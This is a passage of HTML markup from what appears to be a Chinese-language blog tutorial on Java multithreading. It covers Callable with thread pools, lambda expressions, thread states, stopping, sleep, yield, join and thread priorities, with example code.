class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"坐等开学"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        实现Callable接口创建线程 sx <span class="token operator">=</span> <span class="token keyword">new</span> 实现Callable接口创建线程<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ExecutorService ser <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//创建线程池</span>        Future<span class="token operator">&lt;</span>String<span class="token operator">></span> ser1 <span class="token operator">=</span> ser<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span>sx<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//提交执行</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            String hui <span class="token operator">=</span> ser1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//获取结果（必须抛出异常）</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>hui<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        ser<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//关闭服务</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Lamda"><a href="#Lamda" class="headerlink" title="Lamda"></a>Lamda</h2><h3 id="函数式接口"><a href="#函数式接口" class="headerlink" title="函数式接口"></a>函数式接口</h3><p><strong>当一个接口有且仅有一个抽象方法时，这个接口可以称为函数式接口</strong></p><p>例如：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">interface</span> <span class="token class-name">Me</span><span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">my</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="Lamda表达式"><a href="#Lamda表达式" class="headerlink" title="Lamda表达式"></a><code>Lamda</code>表达式</h3><p><strong>当程序调用一个函数式接口时，可以对这个接口的重写进行简写，这种简写的格式叫做<code>Lamda</code>表达式</strong></p><p>例如:</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">Me</span><span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">my</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Lamda</span>表达式 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Me me <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"我是Atmujie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"传值；"</span> <span class="token operator">+</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Lamda表达式</span>        <span class="token comment" spellcheck="true">/*        Lamda表达式的语句体格式:        引用类型(接口名) 变量名 = (形参变量名【有几个写几个，没有就留空，变量类型写不写均可】) -> {            要执行的语句;        }        */</span>        me<span class="token punctuation">.</span><span class="token function">my</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//调用</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210727164331293.png" alt="image-20210727164331293"></p><p>在多线程中，<code>Lamda</code>表达式的意义在于快速的创建线程，当然同样可以使用匿名内部类达到同样的效果</p><p><code>Lamda</code>从某种意义上来说，是对匿名内部类的再简化</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Lamda</span>表达式 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Runnable runnable <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"歪比歪比"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"歪比巴布"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210727164509460.png" alt="image-20210727164509460"></p><h1 id="线程控制"><a href="#线程控制" class="headerlink" title="线程控制"></a>线程控制</h1><h2 id="线程状态"><a href="#线程状态" class="headerlink" title="线程状态"></a>线程状态</h2><p>线程有五大状态</p><p><img src="image-20210727164853394.png" alt="image-20210727164853394"></p><ul><li><p>创建状态：</p><blockquote><p>当<code>new</code>一个线程时，线程进入创建状态</p></blockquote></li><li><p>就绪状态</p><blockquote><p>当调用<code>start()</code>方法时，线程进入就绪状态</p></blockquote></li><li><p>运行状态</p><blockquote><p>线程自动获取CPU资源，获取成功即进入运行状态</p></blockquote></li><li><p>阻塞状态</p><blockquote><p>当遇到类似<code>sleep</code>的情况，线程进入阻塞状态</p></blockquote></li><li><p>死亡状态</p><blockquote><p>线程结束，进入死亡状态</p></blockquote></li></ul><h4 id="观测线程-状态"><a href="#观测线程-状态" class="headerlink" title="观测线程#状态"></a>观测线程#状态</h4><p><img src="image-20210730120249872.png" alt="image-20210730120249872"></p><p><strong>使用<code>Thread.getState()</code>观测线程状态</strong>    </p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token keyword">static</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>sleep<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 观测线程状态 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread<span class="token punctuation">.</span>State 未开始 <span class="token operator">=</span> thread<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义变量获取状态</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"未开始"</span> <span class="token operator">+</span> 未开始<span class="token punctuation">)</span><span class="token punctuation">;</span>        thread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"开始"</span> <span class="token operator">+</span> thread<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//直接输出状态</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"阻塞"</span> <span class="token operator">+</span> thread<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"结束/死亡"</span> <span class="token operator">+</span> thread<span class="token punctuation">.</span><span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210730122431428.png" alt="image-20210730122431428"></p><h2 id="线程停止"><a href="#线程停止" class="headerlink" title="线程停止"></a>线程停止</h2><p>线程最好自然停止，若定义了循环等无法自然停止的情况，最佳方案是在线程类中定义一个<code>stop()</code>方法人为使它自然停止</p><p>不建议使用自带的<code>stop()</code>等方法强制停止线程</p><p>例如：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 线程停止 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        线程 xc <span class="token operator">=</span> <span class="token keyword">new</span> 线程<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>xc<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                xc<span class="token punctuation">.</span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"线程结束"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> 线程 <span class="token keyword">implements</span> <span class="token class-name">Runnable</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"running..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//人为定义stop，用于停止线程</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>flag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是在<code>main()</code>中使子线程自然停止的方法，不过这样给我的感觉是仍有缺陷（不能立即停止线程运行），所以能在线程中停止就在线程中停止，尽量不要将停止工作交给主函数</p><p><img src="image-20210727174230601.png" alt="image-20210727174230601"></p><p>可以看到当<code>mian()</code>中调用<code>stop()</code>后，线程又运行了一次，这就是无法立即停止</p><h2 id="线程休眠"><a href="#线程休眠" class="headerlink" title="线程休眠"></a>线程休眠</h2><p><img src="image-20210728185802023.png" alt="image-20210728185802023"></p><p><strong>同正常使用，<code>sleep</code>可以让程序延时/暂停运行</strong></p><p><strong>多线程中使用<code>sleep</code>需要抛出/监测处理<code>InterruptedException</code>异常</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 线程休眠倒计时 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        Runnable runnable <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//线程休眠1秒</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"错误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="线程礼让"><a href="#线程礼让" class="headerlink" title="线程礼让"></a>线程礼让</h2><p><img src="image-20210729103202216.png" alt="image-20210729103202216"></p><p>简单来说：<br><strong>线程礼让就是暂停原来正在执行的线程，让正在执行的线程回到就绪状态与其他线程重新开始竞争</strong></p><p><strong>当正在执行的线程再次竞争成功运行时，就是礼让失败</strong></p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 线程礼让 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Runnable runnable <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"线程开始执行"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Thread<span class="token punctuation">.</span><span class="token function">yield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"线程执行完毕"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>礼让成功：</p><p><img src="image-20210729103925126.png" alt="image-20210729103925126"></p><p>礼让失败：</p><p><img src="image-20210729103958848.png" alt="image-20210729103958848"></p><h2 id="线程强制执行"><a href="#线程强制执行" class="headerlink" title="线程强制执行"></a>线程强制执行</h2><p><code>join()</code>可让一个线程强制执行</p><p>即暂听其他所有线程，直到指定线程执行完毕</p><p>使用时要抛出异常</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 线程强制执行 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException<span class="token punctuation">{</span>        Runnable runnable <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i1 <span class="token operator">&lt;</span> <span class="token number">1000</span><span class="token punctuation">;</span> i1<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"runnable"</span> <span class="token operator">+</span> i1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        Thread thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>runnable<span class="token punctuation">)</span><span class="token punctuation">;</span>        thread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> <span class="token number">20</span><span class="token punctuation">)</span> thread<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"main"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210729111335451.png" alt="image-20210729111335451"></p><p>当<code>i == 20</code>时开始强制执行<code>runnable</code>线程，直到<code>runnable</code>线程执行完才继续主线程</p><h3 id="线程优先2级"><a href="#线程优先2级" class="headerlink" title="线程优先2级"></a>线程优先2级</h3><p><strong>首先明确一点，优先级高的线程不一定先调用</strong></p><blockquote><p><strong>线程的调用由CPU决定,优先级大小只是分配给线程的资源多或少</strong></p><p>可以这么理解</p><p>cpu是抽奖的玩家，线程是奖品，线程优先级表示中奖的概率</p><p>一般肯定是先抽到概率高的再抽概率低的，但总有欧皇不当人子，次次出金</p><p>这就是为什么优先级高不一定先调用</p></blockquote><p><strong><code>Thread.getPriority()</code> 获取优先级</strong></p><p><strong><code>Thread.setPriority()</code>设置优先级</strong></p><ul><li>默认优先级为 5</li><li>最低优先级为 1</li><li>最高优先级为 10</li></ul><p>设置不在1-10范围内会抛出异常</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> 多线程<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> 优先级 <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//获取主线程优先级(默认优先级)</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"--->"</span> <span class="token operator">+</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPriority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread thread1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>thread<span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread thread2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>thread<span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread thread3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>thread<span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread thread4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span>thread<span class="token punctuation">)</span><span class="token punctuation">;</span>        thread1<span class="token punctuation">.</span><span class="token function">setPriority</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置优先级为3</span>        thread3<span class="token punctuation">.</span><span class="token function">setPriority</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span>MIN_PRIORITY<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置优先级为最低</span>        thread4<span class="token punctuation">.</span><span class="token function">setPriority</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span>MAX_PRIORITY<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置最高优先级</span>        thread1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        thread2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        thread3<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        thread4<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>thread1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"--->"</span> <span class="token operator">+</span> thread1<span class="token punctuation">.</span><span class="token function">getPriority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//优先级为3</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>thread2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token 